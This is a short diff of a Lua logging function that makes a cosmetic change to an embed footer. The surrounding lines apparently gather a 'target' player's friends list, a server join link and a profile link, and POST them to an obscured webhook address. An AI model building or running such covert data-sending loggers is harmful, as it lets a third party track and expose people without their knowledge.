@@ -117,8 +117,7 @@ local function _LOG()
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                     {["name"] = "Links", ["value"] = "[Join Server](" .. joinUrl .. ") | [Profile](" .. profileUrl .. ")", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%m/%d/%y %I:%M %p")},
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                ["footer"] = {["text"] = "Logger | " .. string.upper(_st)}
             }}
         }
         req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
